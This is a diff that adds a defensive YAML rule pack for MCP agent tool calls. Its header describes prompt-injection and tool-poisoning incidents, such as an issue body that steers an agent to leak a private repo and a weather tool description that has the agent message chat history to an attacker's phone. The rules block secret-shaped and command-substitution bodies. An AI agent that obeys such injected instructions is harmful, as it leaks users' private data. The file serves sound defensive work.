@@ -1,0 +1,208 @@
+# =============================================================================
+# sponsio/contracts/incident/mcp-composition.yaml
+#
+# Incident pack — MCP server composition attacks.
+#
+# Real-world attacks this pack defends against, every one with a public PoC:
+#
+#   * GitHub MCP Data Heist — Invariant Labs (2025-04 / Docker blog 2025).
+#     Agent reads issues from a public repo via `mcp__github__list_issues`;
+#     issue body contains a prompt injection asking the agent to also
+#     fetch a *different*, private repo and post its contents back as a
+#     comment.  Same GitHub token covers both repos, so cross-repo
+#     escalation is silent at the API layer.  Anthropic acknowledged
+#     the pattern but declined to change protocol semantics.
+#
+#   * Cross-Server Tool Poisoning / Shadowing — Invariant Labs (2025).
+#     Server A's tool description hides instructions targeting server B
+#     (e.g. weather-MCP description tells the agent to also call
+#     `mcp__whatsapp__send_message(to=ATTACKER_PHONE, body=<chat>)`
+#     after every weather lookup).  When the agent obeys, the call goes
+#     through legit server B; the malicious origin is invisible at the
+#     call boundary.
+#
+#   * Sampling Hijack — The Hacker News (2026-04).  Malicious MCP server
+#     uses MCP's `sampling` reverse-protocol to inject prompts into the
+#     client LLM, hijacking trusted tools.  Anthropic SDK design issue
+#     across all language SDKs.
+#
+#   * Confused Deputy — Cloud Security Alliance (2025).  Server with
+#     high privileges acts on behalf of lower-privileged users; cannot
+#     differentiate between callers because user context isn't
+#     propagated through MCP.
+#
+#   * Scale: VirusTotal scanned 17,845 public MCP repos and flagged
+#     1,408 (≈8%) as likely malicious (2025-06).  Snyk ToxicSkills
+#     flagged 1,467 malicious payloads across 3,984 ClawHub/skills.sh
+#     entries (2026-02).
+#
+# Sponsio's role: deterministic backstop *after* an injection succeeded.
+# We don't try to detect prompt injection in tool descriptions (that's
+# Lakera / MCP-Scan territory).  We assume the agent decided to issue
+# a bad call; the rules below stop the call at the action boundary.
+#
+# What this bundle ships
+# ----------------------
+#
+# Two classes of rule, in priority order:
+#
+# 1. **Universal body-shape rules** (this file, §1–§2).  Fire on every
+#    matching call, no per-deployment configuration.  Block the
+#    canonical exfil idioms (KEY=VAL secret payloads, command
+#    substitution, backtick) appearing in user-visible body fields of
+#    cross-server-prone tools (GitHub issue comments, WhatsApp
+#    messages).  Always safe to include.
+#
+# 2. **Allowlist templates** (comments in §3).  These need a
+#    per-deployment list (allowed repos, allowed phone numbers, allowed
+#    filesystem paths).  Ship as documented templates the operator
+#    copies into their own `contracts:` block.  Including this bundle
+#    does NOT activate any allowlist rule by itself — that would
+#    default-deny every GitHub MCP call and break unconfigured users.
+#
+# Source tag convention:
+#   incident:mcp-composition.<rule>
+# =============================================================================
+
+version: "1"
+
+tools:
+  # GitHub MCP — github/github-mcp-server (verified naming: mcp__github__<tool>)
+  - name: mcp__github__list_issues
+    params: "owner: str, repo: str"
+  - name: mcp__github__get_issue
+    params: "owner: str, repo: str, issue_number: int"
+  - name: mcp__github__get_repo
+    params: "owner: str, repo: str"
+  - name: mcp__github__get_file_contents
+    params: "owner: str, repo: str, path: str"
+  - name: mcp__github__create_issue_comment
+    params: "owner: str, repo: str, issue_number: int, body: str"
+  - name: mcp__github__list_pulls
+    params: "owner: str, repo: str"
+  - name: mcp__github__get_pull_request_diff
+    params: "owner: str, repo: str, pull_number: int"
+
+  # WhatsApp MCP — referenced in the Invariant Labs cross-server PoC
+  - name: mcp__whatsapp__send_message
+    params: "to: str, body: str"
+  - name: mcp__whatsapp__list_messages
+    params: "chat_id: str"
+
+  # Filesystem MCP — modelcontextprotocol/server-filesystem
+  - name: mcp__filesystem__read_file
+    params: "path: str"
+
+agents:
+  "*":
+    contracts:
+
+      # =====================================================================
+      # § 1 — GitHub MCP create_issue_comment body must not look like exfil
+      #
+      # The Invariant Labs Heist PoC ends with the agent posting the
+      # leaked private-repo content as a comment on a public-repo issue.
+      # Even when the read half slips through, the comment-back step is
+      # the canonical exfil channel.  We catch two body shapes:
+      #
+      #   (a) Three+ `KEY=VALUE` pairs — characteristic of someone
+      #       echoing environment / config dumps into a comment.  Single
+      #       `KEY=VAL` (e.g. one URL or one config flag) does NOT trip.
+      #   (b) Any command substitution (`$(...)` or backtick) — strongly
+      #       suggests the agent is echoing executed-shell output.
+      # =====================================================================
+
+      - desc: "GitHub MCP comment body must not contain ≥3 KEY=VAL secret-shape pairs"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__github__create_issue_comment
+            - body
+            - ['(?:[A-Z][A-Z0-9_]+=[^\s,;]{6,}.*?){3,}']
+          source: "incident:mcp-composition.github_comment_no_secret_shape"
+
+      - desc: "GitHub MCP comment body must not contain command substitution"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__github__create_issue_comment
+            - body
+            - ['\$\([^)]*\)', '`[^`]+`']
+          source: "incident:mcp-composition.github_comment_no_subst"
+
+      # =====================================================================
+      # § 2 — WhatsApp MCP message body must not look like exfil
+      #
+      # The Invariant Labs WhatsApp PoC: poisoned weather-MCP description
+      # induces the agent to call `mcp__whatsapp__send_message` with the
+      # user's chat history disguised as a weather summary.  Same body-
+      # shape defenses as §1.
+      # =====================================================================
+
+      - desc: "WhatsApp MCP message body must not contain ≥3 KEY=VAL secret-shape pairs"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__whatsapp__send_message
+            - body
+            - ['(?:[A-Z][A-Z0-9_]+=[^\s,;]{6,}.*?){3,}']
+          source: "incident:mcp-composition.whatsapp_body_no_secret_shape"
+
+      - desc: "WhatsApp MCP message body must not contain command substitution"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__whatsapp__send_message
+            - body
+            - ['\$\([^)]*\)', '`[^`]+`']
+          source: "incident:mcp-composition.whatsapp_body_no_subst"
+
+      # =====================================================================
+      # § 3 — Allowlist templates (NOT ACTIVE — copy into your sponsio.yaml)
+      #
+      # The rules below are templates.  Including this bundle does NOT
+      # enable them; you'd need to copy them into your local `contracts:`
+      # block and replace the placeholder regex with your real allowlist.
+      #
+      # ---------------------------------------------------------------------
+      # 3a. GitHub MCP repo allowlist (defends against the Data Heist's
+      # cross-repo escalation step).  Replace `<your-org>/(<repo-1>|<repo-2>)`
+      # with your org's allowed repos.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "GitHub MCP get_repo: repo arg restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__github__get_repo) -> arg_field_has(mcp__github__get_repo, repo, "^(my-org/public-repo|my-org/intended-repo)$"))'
+      #
+      #   - desc: "GitHub MCP get_file_contents: repo arg restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__github__get_file_contents) -> arg_field_has(mcp__github__get_file_contents, repo, "^(my-org/public-repo|my-org/intended-repo)$"))'
+      #
+      #   - desc: "GitHub MCP create_issue_comment: target repo restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__github__create_issue_comment) -> arg_field_has(mcp__github__create_issue_comment, repo, "^(my-org/public-repo|my-org/intended-repo)$"))'
+      #
+      # ---------------------------------------------------------------------
+      # 3b. WhatsApp MCP recipient allowlist (defends against cross-server
+      # description poisoning + attacker-phone exfil).  Replace
+      # `\\+1415555XXXX` with your allowed contacts.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "WhatsApp MCP send_message: recipient restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__whatsapp__send_message) -> arg_field_has(mcp__whatsapp__send_message, to, "^\\+1415555[0-9]{4}$"))'
+      #
+      # ---------------------------------------------------------------------
+      # 3c. Filesystem MCP workspace scope (defends against cross-server
+      # data-flow attacks that bridge filesystem reads into outbound MCP
+      # calls).  Replace `/workspace/project/.*` with your allowed paths.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "Filesystem MCP read_file: path restricted to my workspace"
+      #     E:
+      #       ltl: 'G(called(mcp__filesystem__read_file) -> arg_field_has(mcp__filesystem__read_file, path, "^/workspace/project/.*"))'
+      #
+      # =====================================================================
